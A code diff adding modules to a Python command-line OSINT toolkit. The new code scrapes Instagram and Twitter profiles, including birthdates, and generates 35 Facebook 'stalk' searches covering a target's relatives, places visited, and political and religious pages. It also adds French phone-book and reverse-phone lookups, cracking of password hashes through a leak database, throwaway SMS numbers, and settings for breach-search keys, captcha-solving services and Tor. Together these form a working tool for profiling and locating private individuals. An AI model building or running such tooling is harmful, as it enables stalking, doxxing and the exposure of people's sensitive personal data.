+            resp = requests.get(url, headers={"User-Agent": random.choice(CONFIG["user_agents"])}, timeout=10)
+            html = resp.content.decode('utf-8')
+            page0 = resp.text
+            json_match = re.findall(r'<input type="hidden" id="init-data" class="json-data" value="(.*?)">', html)
+            if not json_match:
+                return result
+            data = json_match[0].replace("&quot;", "\"")
+            values = json.loads(data)['profile_user']
+            birth = re.findall(r'birthdateText.*?>(.*?)<', page0)
+            result.update({
+                "found": True,
+                "id": values.get('id_str', ''),
+                "name": values.get('name', ''),
+                "screen_name": values.get('screen_name', ''),
+                "location": values.get('location', ''),
+                "url": values.get('url', ''),
+                "description": values.get('description', ''),
+                "protected": values.get('protected', False),
+                "verified": values.get('verified', False),
+                "followers": values.get('followers_count', 0),
+                "friends": values.get('friends_count', 0),
+                "statuses": values.get('statuses_count', 0),
+                "created_at": values.get('created_at', ''),
+                "lang": values.get('lang', ''),
+                "birth": birth[0].strip() if birth else "N/A",
+            })
+        except: pass
+        return result
+
+
+FACEBOOK_STALK_TYPES = {
+    "1":  "Photos tagged",           "2":  "Videos tagged",
+    "3":  "Stories tagged",          "4":  "Relatives",
+    "5":  "Friends",                 "6":  "Friends in common",
+    "7":  "Employees",               "8":  "School students",
+    "9":  "Local residents",         "10": "All places visited",
+    "11": "Bars visited",            "12": "Restaurants visited",
+    "13": "Stores visited",          "14": "Outdoor places",
+    "15": "Hotels visited",          "16": "Theatres visited",
+    "17": "Photos liked",            "18": "Videos liked",
+    "19": "Stories liked",           "20": "Photos commented",
+    "21": "Photos by user",          "22": "Videos by user",
+    "23": "Stories by user",         "24": "Groups joined",
+    "25": "Future events",           "26": "Past events",
+    "27": "Games used",              "28": "Apps used",
+    "29": "Pages liked",             "30": "Political pages",
+    "31": "Religious pages",         "32": "Music pages",
+    "33": "Movie pages",             "34": "Book pages",
+    "35": "Places liked",
+}
+
+FACEBOOK_GRAPH_URLS = {
+    "1": "https://www.facebook.com/search/{}/photos-of/intersect",
+    "2": "https://www.facebook.com/search/{}/videos-of/intersect",
+    "3": "https://www.facebook.com/search/{}/stories-tagged/intersect",
+    "4": "https://www.facebook.com/search/{}/relatives/intersect",
+    "5": "https://www.facebook.com/search/{}/friends/intersect",
+    "6": "https://www.facebook.com/search/{}/friends/friends/intersect",
+    "7": "https://www.facebook.com/search/{}/employees/intersect/",
+    "8": "https://www.facebook.com/search/{}/schools-attended/ever-past/intersect/students/intersect/",
+    "9": "https://www.facebook.com/search/{}/current-cities/residents-near/present/intersect",
+    "10": "https://www.facebook.com/search/{}/places-visited/",
+    "11": "https://www.facebook.com/search/{}/places-visited/110290705711626/places/intersect/",
+    "12": "https://www.facebook.com/search/{}/places-visited/273819889375819/places/intersect/",
+    "13": "https://www.facebook.com/search/{}/places-visited/200600219953504/places/intersect/",
+    "14": "https://www.facebook.com/search/{}/places-visited/935165616516865/places/intersect/",
+    "15": "https://www.facebook.com/search/{}/places-visited/164243073639257/places/intersect/",
+    "16": "https://www.facebook.com/search/{}/places-visited/192511100766680/places/intersect/",
+    "17": "https://www.facebook.com/search/{}/photos-liked/intersect",
+    "18": "https://www.facebook.com/search/{}/videos-liked/intersect",
+    "19": "https://www.facebook.com/search/{}/stories-liked/intersect",
+    "20": "https://www.facebook.com/search/{}/photos-commented/intersect",
+    "21": "https://www.facebook.com/search/{}/photos-by/",
+    "22": "https://www.facebook.com/search/{}/videos-by/",
+    "23": "https://www.facebook.com/search/{}/stories-by/",
+    "24": "https://www.facebook.com/search/{}/groups",
+    "25": "https://www.facebook.com/search/{}/events-joined/",
+    "26": "https://www.facebook.com/search/{}/events-joined/in-past/date/events/intersect/",
+    "27": "https://www.facebook.com/search/{}/apps-used/game/apps/intersect",
+    "28": "https://www.facebook.com/search/{}/apps-used/",
+    "29": "https://www.facebook.com/search/{}/pages-liked/intersect",
+    "30": "https://www.facebook.com/search/{}/pages-liked/161431733929266/pages/intersect/",
+    "31": "https://www.facebook.com/search/{}/pages-liked/religion/pages/intersect/",
+    "32": "https://www.facebook.com/search/{}/pages-liked/musician/pages/intersect/",
+    "33": "https://www.facebook.com/search/{}/pages-liked/movie/pages/intersect/",
+    "34": "https://www.facebook.com/search/{}/pages-liked/book/pages/intersect/",
+    "35": "https://www.facebook.com/search/{}/places-liked/",
+}
+
+
+def receive_sms_menu():
+    """Free SMS Reception — Receive SMS on temporary numbers"""
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} FREE SMS RECEPTION")
+    print(f" {Wh}{'='*55}")
+    print(f"{Y}[!] Receive SMS on temporary virtual numbers{Wh}")
+    
+    receiver = SMSReceiver()
+    servers = receiver.search_servers()
+    if not servers:
+        print(f"{R}[!] Could not fetch server list{Wh}")
+        input(f"\n[+] Press Enter")
+        return
+    
+    print(f"\n{Gr}[+] Available numbers ({len(servers)}):{Wh}")
+    for s in servers[:15]:
+        print(f"    {Wh}[{C}{s['id']:2}{Wh}] {Gr}+{s['number']} {Wh}({s['country']})")
+    
+    choice = input(f"\n{Wh}[+] Select number [1-{len(servers)}]: {Gr}").strip()
+    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(servers):
+        return
+    selected = servers[int(choice) - 1]
+    number_path = f"{selected['number']}-{selected['country']}"
+    
+    messages = receiver.fetch_messages(number_path)
+    print(f"\n{Gr}[+] Messages found: {messages['count']}{Wh}")
+    for i, (fr, msg, t) in enumerate(zip(messages['from_users'], messages['messages'], messages['times'])):
+        if fr:
+            print(f"\n    {Wh}[{i}] From: {C}{fr}")
+            print(f"    {Wh}Msg:  {Gr}{msg}")
+            print(f"    {Wh}Time: {Y}{t}")
+    
+    if input(f"\n{Wh}[?] Listen live for new messages? {Gr}(y/n){Wh}: {Gr}").strip().lower() == 'y':
+        receiver.listen_live(number_path)
+    
+    input(f"\n[+] Press Enter")
+
+
+def hash_decrypt_menu():
+    """Hash Decryption — Decrypt hashes via lea.kz leak database"""
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} HASH DECRYPTION (lea.kz)")
+    print(f" {Wh}{'='*55}")
+    print(f"{Wh}[1] Decrypt hash")
+    print(f"{Wh}[2] Check email leak")
+    
+    mode = input(f"\n{Wh}[+] Mode [1/2]: {Gr}").strip()
+    decryptor = HashDecryptor()
+    
+    if mode == "1":
+        h = input(f"{Wh}[+] Enter hash (MD5/SHA1/SHA256): {Gr}").strip()
+        if not h: return
+        print(f"{Y}[*] Decrypting {h}...{Wh}")
+        pwd = decryptor.decrypt(h)
+        if pwd:
+            print(f"{Gr}[+] Password: {C}{pwd}{Wh}")
+        else:
+            print(f"{Y}[-] No match found in leak database{Wh}")
+    elif mode == "2":
+        email = input(f"{Wh}[+] Enter email: {Gr}").strip()
+        if not email: return
+        print(f"{Y}[*] Checking {email}...{Wh}")
+        leak = decryptor.check_email_leak(email)
+        if leak:
+            print(f"{R}[!] Leaked! Source: {C}{leak}{Wh}")
+        else:
+            print(f"{Gr}[+] No leak found{Wh}")
+    
+    input(f"\n[+] Press Enter")
+
+
+def instagram_osint_menu():
+    """Instagram Profile OSINT — Extracts data from embedded JSON"""
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} INSTAGRAM OSINT (JSON PARSING)")
+    print(f" {Wh}{'='*55}")
+    
+    username = input(f"{Wh}[+] Instagram username: {Gr}").strip()
+    if not username: return
+    
+    print(f"{Y}[*] Fetching profile data...{Wh}")
+    scraper = InstagramScraper()
+    profile = scraper.get_profile(username)
+    
+    if not profile.get("found"):
+        print(f"{R}[!] Profile not found or private{Wh}")
+        input(f"\n[+] Press Enter")
+        return
+    
+    print(f"\n{Gr}[+] Profile found!{Wh}")
+    print(f"    {Wh}Username    : {C}{profile['username']}")
+    print(f"    {Wh}Full Name   : {Gr}{profile['full_name']}")
+    print(f"    {Wh}ID          : {Y}{profile['id']}")
+    print(f"    {Wh}Private     : {Gr}{profile['private']}")
+    print(f"    {Wh}Verified    : {Gr}{profile['verified']}")
+    print(f"    {Wh}Business    : {Gr}{profile['business']}")
+    print(f"    {Wh}Followers   : {C}{profile['followers']:,}")
+    print(f"    {Wh}Following   : {C}{profile['following']:,}")
+    print(f"    {Wh}Posts       : {C}{profile['posts']:,}")
+    if profile.get('biography'):
+        print(f"    {Wh}Bio         : {Y}{profile['biography'][:150]}")
+    if profile.get('external_url'):
+        print(f"    {Wh}Website     : {C}{profile['external_url']}")
+    if profile.get('profile_pic_hd'):
+        print(f"    {Wh}Profile Pic : {C}{profile['profile_pic_hd']}")
+    
+    # Save report
+    result = ScanResult(
+        timestamp=datetime.now().isoformat(),
+        scan_type="instagram",
+        target=username,
+        data=profile
+    )
+    save_report(result)
+    
+    # Integration: pass to DeepDive
+    if input(f"\n{Wh}[?] Run DeepDive on this username? {Gr}(y/n){Wh}: {Gr}").strip().lower() == 'y':
+        try:
+            orchestrator = InvestigationOrchestrator(username)
+            orchestrator.run()
+        except Exception as e:
+            print(f"{Y}[!] DeepDive: {str(e)[:40]}{Wh}")
+    
+    input(f"\n[+] Press Enter")
+
+
+def twitter_osint_menu():
+    """Twitter Profile OSINT — Extracts data from embedded JSON"""
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} TWITTER OSINT (JSON PARSING)")
+    print(f" {Wh}{'='*55}")
+    
+    username = input(f"{Wh}[+] Twitter username (without @): {Gr}").strip()
+    if not username: return
+    
+    print(f"{Y}[*] Fetching profile data...{Wh}")
+    scraper = TwitterScraper()
+    profile = scraper.get_profile(username)
+    
+    if not profile.get("found"):
+        print(f"{R}[!] Profile not found{Wh}")
+        # Try search
+        print(f"{Y}[*] Searching for '{username}'...{Wh}")
+        users = scraper.search_users(username)
+        if users:
+            print(f"{Gr}[+] Found users:{Wh}")
+            for u in users[:10]:
+                print(f"    {Wh}- @{C}{u['screen_name']:<20}{Wh} ({u['name']})")
+        input(f"\n[+] Press Enter")
+        return
+    
+    print(f"\n{Gr}[+] Profile found!{Wh}")
+    print(f"    {Wh}Username    : @{C}{profile['screen_name']}")
+    print(f"    {Wh}Name        : {Gr}{profile['name']}")
+    print(f"    {Wh}ID          : {Y}{profile['id']}")
+    print(f"    {Wh}Verified    : {Gr}{profile['verified']}")
+    print(f"    {Wh}Protected   : {Gr}{profile['protected']}")
+    print(f"    {Wh}Followers   : {C}{profile['followers']:,}")
+    print(f"    {Wh}Following   : {C}{profile['friends']:,}")
+    print(f"    {Wh}Tweets      : {C}{profile['statuses']:,}")
+    print(f"    {Wh}Location    : {Y}{profile['location']}")
+    print(f"    {Wh}Birth       : {Y}{profile['birth']}")
+    print(f"    {Wh}Language    : {Gr}{profile['lang']}")
+    print(f"    {Wh}Created     : {Y}{profile['created_at']}")
+    if profile.get('description'):
+        print(f"    {Wh}Bio         : {Y}{profile['description'][:150]}")
+    if profile.get('url'):
+        print(f"    {Wh}URL         : {C}{profile['url']}")
+    
+    result = ScanResult(
+        timestamp=datetime.now().isoformat(),
+        scan_type="twitter",
+        target=username,
+        data=profile
+    )
+    save_report(result)
+    
+    if input(f"\n{Wh}[?] Run DeepDive on this username? {Gr}(y/n){Wh}: {Gr}").strip().lower() == 'y':
+        try:
+            orchestrator = InvestigationOrchestrator(username)
+            orchestrator.run()
+        except Exception as e:
+            print(f"{Y}[!] DeepDive: {str(e)[:40]}{Wh}")
+    
+    input(f"\n[+] Press Enter")
+
+
+def facebook_stalk_menu():
+    """Facebook Advanced GraphSearch — 35 search types (ported from LittleBrother)"""
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} FACEBOOK GRAPHSEARCH (35 TYPES)")
+    print(f" {Wh}{'='*55}")
+    print(f"{Y}[!] Requires Facebook profile ID or username{Wh}")
+    
+    profile_id = input(f"{Wh}[+] Facebook profile ID/username: {Gr}").strip()
+    if not profile_id: return
+    
+    print(f"\n{Wh}Search types:{Wh}")
+    for k, v in FACEBOOK_STALK_TYPES.items():
+        print(f"    {R}[{Gr}{k:2}{R}]{Wh} {v}")
+    
+    choice = input(f"\n{Wh}[+] Type [1-35, or 'all']: {Gr}").strip().lower()
+    if choice == "all":
+        selected = list(FACEBOOK_GRAPH_URLS.keys())
+    elif choice in FACEBOOK_GRAPH_URLS:
+        selected = [choice]
+    else:
+        print(f"{R}[!] Invalid choice{Wh}")
+        input(f"\n[+] Press Enter")
+        return
+    
+    print(f"\n{Gr}[+] Opening in browser...{Wh}")
+    for sel in selected[:5]:
+        url = FACEBOOK_GRAPH_URLS[sel].format(profile_id)
+        print(f"    {C}{FACEBOOK_STALK_TYPES[sel]}: {url}{RS}")
+        try:
+            import webbrowser
+            webbrowser.open(url)
+        except: pass
+    
+    print(f"\n{Y}[*] Links printed above — open in browser manually if needed{Wh}")
+    input(f"\n[+] Press Enter")
+
+
+def pages_jaunes_search():
+    """French Directory Search — Pages Jaunes / Pages Blanches (ported from LittleBrother)"""
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} FRENCH DIRECTORY (PAGES JAUNES)")
+    print(f" {Wh}{'='*55}")
+    
+    print(f"{Wh}[1] Search by name (Pages Blanches)")
+    print(f"{Wh}[2] Reverse phone lookup")
+    print(f"{Wh}[3] Search by address")
+    
+    mode = input(f"\n{Wh}[+] Mode [1/2/3]: {Gr}").strip()
+    
+    headers = {
+        'User-Agent': random.choice(CONFIG["user_agents"]),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    }
+    
+    if mode == "1":
+        name = input(f"{Wh}[+] Firstname Lastname: {Gr}").strip()
+        city = input(f"{Wh}[+] City/Department: {Gr}").strip()
+        if not name: return
+        print(f"{Y}[*] Searching French directory for {name} in {city}...{Wh}")
+        try:
+            url = f"https://www.pagesjaunes.fr/pagesblanches/recherche?quoiqui={name}&ou={city}"
+            resp = requests.get(url, headers=headers, timeout=15)
+            if resp.status_code == 200 and BeautifulSoup:
+                soup = BeautifulSoup(resp.text, "html.parser")
+                names = soup.find_all("a", {"class": "denomination-links pj-lb pj-link"})
+                addresses = soup.find_all("a", {"class": "adresse pj-lb pj-link"})
+                phones = soup.find_all("strong", {"class": "num"})
+                if names:
+                    print(f"\n{Gr}[+] Results:{Wh}")
+                    for i, (n, a, p) in enumerate(zip(names[:10], addresses[:10], phones[:10]), 1):
+                        print(f"\n    {Wh}[{i}] {C}{n.text.strip()}")
+                        print(f"    {Wh}    Addr: {Y}{a.text.strip()}")
+                        print(f"    {Wh}    Tel:  {Gr}{p.text.strip()}")
+                else:
+                    print(f"{Y}[-] No results found{Wh}")
+        except Exception as e:
+            print(f"{R}[!] Error: {str(e)[:50]}{Wh}")
+    
+    elif mode == "2":
+        phone = input(f"{Wh}[+] French phone number: {Gr}").strip()
+        if not phone: return
+        print(f"{Y}[*] Reverse lookup for {phone}...{Wh}")
+        try:
+            url = f"https://www.pagesjaunes.fr/annuaireinverse/recherche?quoiqui={phone}"
+            resp = requests.get(url, headers=headers, timeout=15)
+            if resp.status_code == 200 and BeautifulSoup:
+                soup = BeautifulSoup(resp.text, "html.parser")
+                names = soup.find_all("a", {"class": "denomination-links pj-lb pj-link"})
+                addresses = soup.find_all("a", {"class": "adresse pj-lb pj-link"})
+                if names:
+                    print(f"\n{Gr}[+] Found:{Wh}")
+                    for n, a in zip(names[:5], addresses[:5]):
+                        print(f"    {Wh}- {C}{n.text.strip()} {Wh}| {Y}{a.text.strip()}")
+                else:
+                    print(f"{Y}[-] No result{Wh}")
+        except Exception as e:
+            print(f"{R}[!] Error: {str(e)[:50]}{Wh}")
+    
+    elif mode == "3":
+        addr = input(f"{Wh}[+] Address: {Gr}").strip()
+        if not addr: return
+        try:
+            url = f"https://www.pagesjaunes.fr/pagesblanches/recherche?quoiqui=&ou={addr}"
+            resp = requests.get(url, headers=headers, timeout=15)
+            if resp.status_code == 200 and BeautifulSoup:
+                soup = BeautifulSoup(resp.text, "html.parser")
+                names = soup.find_all("a", {"class": "denomination-links pj-lb pj-link"})
+                addresses = soup.find_all("a", {"class": "adresse pj-lb pj-link"})
+                if names:
+                    print(f"\n{Gr}[+] Residents:{Wh}")
+                    for n, a in zip(names[:10], addresses[:10]):
+                        print(f"    {Wh}- {C}{n.text.strip()} {Wh}| {Y}{a.text.strip()}")
+        except Exception as e:
+            print(f"{R}[!] Error: {str(e)[:50]}{Wh}")
+    
+    input(f"\n[+] Press Enter")
+
+
+def email_header_analyze():
+    """Email Header Analysis — Extract IP and ISP from email headers (ported from LittleBrother)"""
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} EMAIL HEADER ANALYSIS")
+    print(f" {Wh}{'='*55}")
+    print(f"{Y}[!] Paste the full email headers (Received lines, From, etc.){Wh}")
+    print(f"{Y}    Type/paste headers, then Ctrl+Z + Enter to finish:{Wh}")
+    
+    lines = []
+    try:
+        while True:
+            line = input()
+            lines.append(line)
+    except EOFError:
+        pass
+    
+    header_text = "\n".join(lines)
+    
+    print(f"\n{Y}[*] Analyzing email headers...{Wh}")
+    
+    # Extract sender
+    from_match = re.search(r"From:\s*(.+)", header_text)
+    if from_match:
+        sender = from_match.group(1).strip()
+        print(f"{Wh}  From          : {C}{sender}")
+    
+    # Extract IPs from Received headers
+    ips_found = set()
+    for line in header_text.split('\n'):
+        if 'Received:' in line or 'received:' in line:
+            found_ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line)
+            for ip in found_ips:
+                if not ip.startswith("10.") and not ip.startswith("192.168.") and not ip.startswith("172.16."):
+                    ips_found.add(ip)
+    
+    if ips_found:
+        print(f"\n{Gr}[+] Found {len(ips_found)} public IP(s):{Wh}")
+        for ip in ips_found:
+            try:
+                host = socket.gethostbyaddr(ip)
+                hostname = host[0]
+            except:
+                hostname = "N/A"
+            try:
+                resp = requests.get(f"http://ip-api.com/json/{ip}?fields=isp,org,country,city", timeout=5)
+                geo = resp.json()
+                isp = geo.get('isp', 'N/A')
+                loc = f"{geo.get('city', '?')}, {geo.get('country', '?')}"
+            except:
+                isp, loc = "N/A", "N/A"
+            print(f"\n    {Wh}IP      : {C}{ip}")
+            print(f"    {Wh}Hostname: {Y}{hostname}")
+            print(f"    {Wh}ISP     : {Gr}{isp}")
+            print(f"    {Wh}Location: {Y}{loc}")
+    else:
+        print(f"{Y}[-] No public IPs found in headers{Wh}")
+    
+    # Save
+    data = {"headers_snippet": header_text[:500], "ips": list(ips_found)}
+    result = ScanResult(
+        timestamp=datetime.now().isoformat(),
+        scan_type="email_header",
+        target="email_headers",
+        data=data
+    )
+    save_report(result)
+    input(f"\n[+] Press Enter")
+
+
+# ═══════════════════════════════════════════════
+# CONFIGURATION MENU — Set API Keys at Runtime
+# ═══════════════════════════════════════════════
+
+def settings_menu():
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R}CONFIGURATION SETTINGS")
+    print(f" {Wh}{'='*55}")
+    
+    while True:
+        print(f"\n{Wh}─── Current Configuration ───")
+        print(f"  {Wh}1) DeHashed Email : {Gr}{DEHASHED_CONFIG['email'] or 'NOT SET'}")
+        print(f"  {Wh}2) DeHashed API   : {Gr}{'****' if DEHASHED_CONFIG['api_key'] else 'NOT SET'}")
+        print(f"  {Wh}3) Groq API Key   : {Gr}{'****' if os.environ.get('GROQ_API_KEY') else 'NOT SET'}")
+        print(f"  {Wh}4) Captcha API Key: {Gr}{'****' if CAPTCHA_CONFIG['api_key'] else 'NOT SET'}")
+        print(f"  {Wh}5) Captcha Service: {Gr}{CAPTCHA_CONFIG['service']}")
+        print(f"  {Wh}6) Tor Proxy      : {Gr}{'ENABLED' if CONFIG['use_tor'] else 'DISABLED'}")
+        print(f"  {Wh}7) Max Threads    : {Gr}{CONFIG['max_threads']}")
+        print(f"  {Wh}8) Request Timeout: {Gr}{CONFIG['request_timeout']}s")
+        print(f"  {Wh}9) Output Dir     : {Gr}{CONFIG['output_dir']}")
+        print(f"  {Wh}0) Back to Main Menu")
+        
+        choice = input(f"\n{Wh}[+] Select [0-9]: {Gr}").strip()
+        
+        if choice == "1":
+            val = input(f"{Wh}[+] DeHashed email: {Gr}").strip()
+            if val:
+                DEHASHED_CONFIG["email"] = val
+                print(f"{Gr}[+] Updated{Wh}")
+        elif choice == "2":
+            val = input(f"{Wh}[+] DeHashed API key: {Gr}").strip()
+            if val:
+                DEHASHED_CONFIG["api_key"] = val
+                print(f"{Gr}[+] Updated{Wh}")
+        elif choice == "3":
+            val = input(f"{Wh}[+] Groq API key: {Gr}").strip()
+            if val:
+                os.environ["GROQ_API_KEY"] = val
+                print(f"{Gr}[+] Updated{Wh}")
+        elif choice == "4":
+            val = input(f"{Wh}[+] Captcha API key (2captcha/capsolver): {Gr}").strip()
+            if val:
+                CAPTCHA_CONFIG["api_key"] = val
+                print(f"{Gr}[+] Updated{Wh}")
+        elif choice == "5":
+            val = input(f"{Wh}[+] Captcha service [2captcha/capsolver]: {Gr}").strip().lower()
+            if val in ("2captcha", "capsolver"):
+                CAPTCHA_CONFIG["service"] = val
+                print(f"{Gr}[+] Updated{Wh}")
+        elif choice == "6":
+            CONFIG["use_tor"] = not CONFIG["use_tor"]
+            print(f"{Gr}[+] Tor {'ENABLED' if CONFIG['use_tor'] else 'DISABLED'}{Wh}")
+        elif choice == "7":
+            val = input(f"{Wh}[+] Max threads [1-50]: {Gr}").strip()
+            if val.isdigit():
+                CONFIG["max_threads"] = max(1, min(50, int(val)))
+                print(f"{Gr}[+] Updated{Wh}")
+        elif choice == "8":
+            val = input(f"{Wh}[+] Request timeout seconds [5-60]: {Gr}").strip()
+            if val.isdigit():
+                CONFIG["request_timeout"] = max(5, min(60, int(val)))
+                print(f"{Gr}[+] Updated{Wh}")
+        elif choice == "9":
+            val = input(f"{Wh}[+] Output directory: {Gr}").strip()
+            if val:
+                CONFIG["output_dir"] = val
+                print(f"{Gr}[+] Updated{Wh}")
+        elif choice == "0":
+            break
+
 
 BANNER_0XK = R"""                  .·´¯¯¯¯¯¯`·.
                 :'                 ':
@@ -5336,40 +10298,59 @@ def run_banner():
     clear()
     selected = random.choice(BANNER_IMAGES)
     print(f"\n{R}{selected}{RS}")
-    print(f"\n{C}youtube {R}https://www.youtube.com/@0xk-j7z{RS}\n")
+    print(f"\n{C}sbsecrybt youtube {R}https://www.youtube.com/@0xk-j7z{RS}\n")
 
 def showMenu():
     options = [
         {'num': 1, 'text': 'IP Tracker', 'func': IP_Track},
+        {'num': 34, 'text': 'Masscan Engine (Advanced IP Scan)', 'func': masscan_ip_engine},
         {'num': 2, 'text': 'Phone Number Tracker', 'func': phoneGW},
-        {'num': 3, 'text': 'Username Tracker', 'func': TrackLu},
-        {'num': 4, 'text': 'Email OSINT', 'func': email_osint},
-        {'num': 5, 'text': 'Domain OSINT', 'func': domain_osint},
-        {'num': 6, 'text': 'Metadata Extractor', 'func': metadata_extractor},
-        {'num': 7, 'text': 'Pastebin Search', 'func': pastebin_osint},
-        {'num': 8, 'text': 'GitHub Code Search', 'func': github_osint},
-        {'num': 9, 'text': 'Reverse Image Search', 'func': reverse_image},
-        {'num': 10, 'text': 'Show My IP', 'func': showIP},
-        {'num': 11, 'text': 'Website Downloader', 'func': website_downloader},
-        {'num': 12, 'text': 'Stealth Browser', 'func': stealth_browser_menu},
-        {'num': 13, 'text': 'DeHashed Breach Search', 'func': dehashed_menu},
-        {'num': 14, 'text': 'Dark Web OSINT', 'func': darkweb_menu},
-        {'num': 15, 'text': 'Google Dorks Builder', 'func': dork_builder_menu},
-        {'num': 16, 'text': 'Agentic AI Investigation', 'func': agentic_investigation},
-        {'num': 17, 'text': 'Visualization Graph', 'func': visualization_menu},
-        {'num': 18, 'text': 'Age/Gender Detection', 'func': age_gender_menu},
+        {'num': 3, 'text': 'PhoneTracker Pro Ultra', 'func': phoneGW_Ultra},
+        {'num': 4, 'text': 'TeleSpotter Multi-Search', 'func': teleSearch_engine},
+        {'num': 5, 'text': 'Username Tracker (Quick/Deep/Both)', 'func': TrackLu},
+        {'num': 6, 'text': 'Username Tracker (350+ Sites)', 'func': TrackLu_Super},
+        {'num': 7, 'text': 'Email OSINT', 'func': email_osint},
+        {'num': 8, 'text': 'Domain OSINT', 'func': domain_osint},
+        {'num': 9, 'text': 'Metadata Extractor (Advanced)', 'func': metadata_extractor},
+        {'num': 10, 'text': 'Pastebin Search', 'func': pastebin_osint},
+        {'num': 11, 'text': 'GitHub Code Search', 'func': github_osint},
+        {'num': 12, 'text': 'Reverse Image Search (8 Engines)', 'func': reverse_image},
+        {'num': 13, 'text': 'Show My IP', 'func': showIP},
+        {'num': 14, 'text': 'Website Downloader', 'func': website_downloader},
+        {'num': 15, 'text': 'Stealth Browser', 'func': stealth_browser_menu},
+        {'num': 16, 'text': 'DeHashed Breach Search', 'func': dehashed_menu},
+        {'num': 17, 'text': 'Dark Web OSINT', 'func': darkweb_menu},
+        {'num': 18, 'text': 'Google Dorks Builder', 'func': dork_builder_menu},
+        {'num': 19, 'text': 'Reputation Engine (0-100)', 'func': reputation_engine_menu},
+        {'num': 20, 'text': 'Agentic AI Investigation', 'func': agentic_investigation},
+        {'num': 21, 'text': 'SMOS Smart OSINT', 'func': smart_osint},
+        {'num': 22, 'text': 'AI Correlation Engine (Groq)', 'func': ai_correlation_engine},
+        {'num': 23, 'text': 'Visualization Graph', 'func': visualization_menu},
+        {'num': 24, 'text': 'Age/Gender Detection', 'func': age_gender_menu},
+        {'num': 25, 'text': 'DeepDive (6-Phase Auto-Investigation)', 'func': deepdive_menu},
+        {'num': 26, 'text': 'Free SMS Reception', 'func': receive_sms_menu},
+        {'num': 27, 'text': 'Hash Decryption (lea.kz)', 'func': hash_decrypt_menu},
+        {'num': 28, 'text': 'Instagram OSINT (JSON)', 'func': instagram_osint_menu},
+        {'num': 29, 'text': 'Twitter OSINT (JSON)', 'func': twitter_osint_menu},
+        {'num': 30, 'text': 'Facebook GraphSearch (35x)', 'func': facebook_stalk_menu},
+        {'num': 31, 'text': 'French Directory (PagesJaunes)', 'func': pages_jaunes_search},
+        {'num': 32, 'text': 'Email Header Analyzer', 'func': email_header_analyze},
+        {'num': 33, 'text': 'Setup: API Keys & Config', 'func': settings_menu},
+        {'num': 35, 'text': 'DNSRecon Engine (Advanced DNS Enum)', 'func': dnsrecon_menu},
+        {'num': 36, 'text': 'AI Autonomous Investigator (Agent)', 'func': ai_agent_engine},
+        {'num': 37, 'text': 'Advanced Security & OSINT Modules', 'func': advanced_tools_menu},
         {'num': 0, 'text': 'Exit', 'func': exit},
     ]
     
     clear()
     run_banner()
     
-    print(f"\n{Wh}╔════════════════════════════════════════╗")
-    print(f"{Wh}║{C}            AVAILABLE TOOLS              {Wh}║")
-    print(f"{Wh}╠════════════════════════════════════════╣")
+    print(f"\n{Wh}")
+    print(f"{Wh}{C}            AVAILABLE TOOLS              {Wh}")
+    print(f"{Wh}")
     for opt in options:
-        print(f"{Wh}║  {R}[{Gr}{opt['num']:2}{R}]{Wh}  {opt['text']:<30}║")
-    print(f"{Wh}╚════════════════════════════════════════╝{RS}")
+        print(f"{Wh}  {R}[{Gr}{opt['num']:2}{R}]{Wh}  {opt['text']:<30}")
+    print(f"{Wh}{RS}")
     
     return options
 
@@ -5405,5 +10386,7 @@ def main():
         sys.exit(0)
 
 if __name__ == "__main__":
+    # Auto-install missing dependencies silently at startup
+    _auto_install_all(silent=True)
     main()
 
